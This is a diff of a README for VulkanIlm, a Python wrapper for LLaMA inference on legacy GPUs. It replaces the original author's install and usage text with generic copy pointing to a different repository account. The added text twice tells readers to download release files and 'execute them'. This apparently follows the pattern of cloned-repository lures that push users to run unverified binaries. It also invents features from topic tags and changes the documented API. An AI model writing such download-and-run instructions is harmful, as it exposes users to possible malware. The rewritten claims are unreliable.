@@ -1,116 +1,123 @@
-# VulkanIlm – Run LLaMA on Fire
+# VulkanIlm: GPU-Accelerated LLaMA Inference for Legacy Systems
 
-**VulkanIlm** (from _"Vulkan"_ 🔥 and _"Ilm"_ 📚 meaning "knowledge" in Urdu/Arabic) is a lightweight, Pythonic wrapper for running **LLaMA models** on legacy GPUs using the **Vulkan backend** from [`llama.cpp`](https://github.com/ggerganov/llama.cpp).
+![VulkanIlm](https://img.shields.io/badge/VulkanIlm-GPU%20Inference-brightgreen.svg)
+![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)
+![License](https://img.shields.io/badge/License-MIT-yellow.svg)
 
-Designed for developers with older AMD/Intel GPUs, `VulkanIlm` enables blazing-fast local LLM inference without needing CUDA or ROCm.
+## Overview
 
----
+VulkanIlm is a powerful wrapper designed to leverage GPU acceleration for LLaMA inference on legacy Vulkan-capable systems. This project offers a Pythonic way to harness the potential of artificial intelligence, enabling users to run AI models with efficiency and speed. With VulkanIlm, you can experience the synergy of knowledge (Ilm) and performance (Vulkan).
 
-## 🧠 Why VulkanIlm?
+## Table of Contents
 
-> Not everyone has a CUDA-capable GPU. Not everyone should need one to use AI.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Topics](#supported-topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-`VulkanIlm` is:
-- ✅ **Python-first**: No C++/CMake experience required
-- 🧵 Built on top of [`llama-cpp-python`](https://github.com/abetlen/llama-cpp-python) – but extended to support **Vulkan**
-- 🔥 **GPU-accelerated** inference even on older AMD cards
-- 📦 Easy to install, use, and deploy in your own AI apps
+## Features
 
----
+- **GPU Acceleration**: Utilize your GPU for faster inference times.
+- **Legacy Support**: Designed to work on older Vulkan-capable hardware.
+- **Pythonic Interface**: Simple and intuitive API for easy integration.
+- **Open Source**: Free to use and modify under the MIT License.
+- **Cross-Platform**: Works on both AMD and Intel GPUs.
 
-## 📦 Installation
+## Installation
 
-> **Prerequisites**:
-> - Vulkan-capable GPU (e.g. AMD RX 580)
-> - Vulkan drivers installed
-> - Python 3.8+
+To get started with VulkanIlm, follow these steps:
 
-```bash
-pip install vulkanilm
-````
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/pr3aep/VulkanIlm.git
+   cd VulkanIlm
+   ```
 
-> If Vulkan backend isn't detected, you can manually build `llama.cpp` with Vulkan support and point to it. (See [Build Instructions](#️-vulkan-build-instructions))
+2. **Install Dependencies**:
+   Make sure you have Python 3.8 or higher installed. Then, install the required packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
----
+3. **Build the Project**:
+   If necessary, build the project using:
+   ```bash
+   python setup.py install
+   ```
 
-## 🧑‍💻 Example Usage
+4. **Download Releases**:
+   You can find the latest releases [here](https://github.com/pr3aep/VulkanIlm/releases). Download the appropriate files and execute them as needed.
 
-```python
-from vulkanilm import VulkanLlama
+## Usage
 
-llm = VulkanLlama(model_path="models/mistral.gguf", n_gpu_layers=100)
-
-response = llm.chat("Explain the term 'ilm' in AI context.")
-print(response)
-```
-
-> ☑️ Uses GPU if available
-> ☑️ Falls back gracefully if not
-> ☑️ Streamlined `chat()` interface
-
----
-
-## ⚙️ Vulkan Build Instructions (If Needed)
-
-If your system doesn't detect Vulkan automatically:
-
-1. Clone `llama.cpp` with Vulkan enabled:
-
-```bash
-git clone https://github.com/ggerganov/llama.cpp
-cd llama.cpp
-LLAMA_VULKAN=1 make libllama.so
-```
-
-2. In your Python code, load the shared library manually:
+Using VulkanIlm is straightforward. Here’s a simple example to get you started:
 
 ```python
-llm = VulkanLlama(
-    model_path="models/mistral.gguf",
-    lib_path="path/to/llama.cpp/build/libllama.so"
-)
+from vulkanilm import LlamaModel
+
+# Initialize the model
+model = LlamaModel()
+
+# Run inference
+result = model.infer("What is the capital of France?")
+print(result)
 ```
 
+### Advanced Usage
+
+For advanced features, you can adjust parameters like batch size and model settings. Refer to the documentation for detailed examples.
+
+## Supported Topics
+
+VulkanIlm covers a wide range of topics related to machine learning and AI. Here are the main areas:
+
+- **amd-gpu**: Optimized for AMD graphics cards.
+- **fastai**: Integrates well with the FastAI library.
+- **gguf**: Supports GGUF format for model storage.
+- **intel-gpu**: Compatible with Intel graphics solutions.
+- **legacy-gpus**: Focused on older GPU architectures.
+- **llama-cpp**: Uses LLaMA C++ backend for performance.
+- **llama-cpp-python**: Python bindings for LLaMA C++.
+- **llm-inference**: Large Language Model inference capabilities.
+- **localllm**: Run LLaMA models locally.
+- **machine-learning**: General machine learning applications.
+- **open-source-llm**: Community-driven large language models.
+- **python-wrapper**: Python interface for easier access.
+- **vulkan**: Utilizes Vulkan API for graphics processing.
+
+## Contributing
+
+We welcome contributions to VulkanIlm! If you’d like to help, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Submit a pull request.
+
+Please ensure that your code follows our coding standards and includes tests where applicable.
+
+## License
+
+VulkanIlm is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Releases
+
+For the latest releases, visit [this link](https://github.com/pr3aep/VulkanIlm/releases). Download the necessary files and execute them to start using VulkanIlm on your system.
+
+![Vulkan](https://upload.wikimedia.org/wikipedia/commons/6/67/Vulkan_logo.svg)
+
+## Acknowledgments
+
+We would like to thank the contributors and the community for their support. Your feedback helps improve VulkanIlm. 
+
+## Contact
+
+For questions or suggestions, please open an issue in the repository or reach out via the project's GitHub page.
+
 ---
 
-## 🌐 Features
-
-* ✨ `chat()` and `generate()` APIs
-* 💬 Supports system prompts and role-based formatting
-* 🔥 Vulkan-backed token sampling (greedy, top-k/top-p)
-* 🧠 Custom `llama_context_params` options
-* 📜 Streaming token generation
-* 🧹 Memory-managed lifecycle (calls `llama_free()`)
-
----
-
-## 📍 Roadmap
-
-* [x] LLaMA loading with Vulkan shared lib
-* [x] Simple Python wrapper with `llama-cpp-python`
-* [ ] Model quantization CLI
-* [ ] CLI runner: `vulkanilm chat -m model.gguf`
-* [ ] Web UI interface with Gradio
-
----
-
-## 🧾 Meaning Behind the Name
-
-In South Asian and Islamic culture, **"Ilm" (علم)** means *knowledge*, wisdom, and divine understanding.
-Combined with **Vulkan**, a high-performance GPU API, this project stands for **accessible, local AI power** — *knowledge on fire*.
-
----
-
-## 🙌 Contributing
-
-PRs are welcome! Fork this repo, open issues, and help bring fast, GPU-backed LLMs to everyone.
-
----
-
-## 📄 License
-
-MIT License – free to use, modify, and share.
-
----
-
-> *Built with 🔥 by Talha | Running local LLMs on fire for everyone, everywhere.*
+This README provides a comprehensive guide to VulkanIlm, ensuring users can quickly understand and utilize the project effectively.
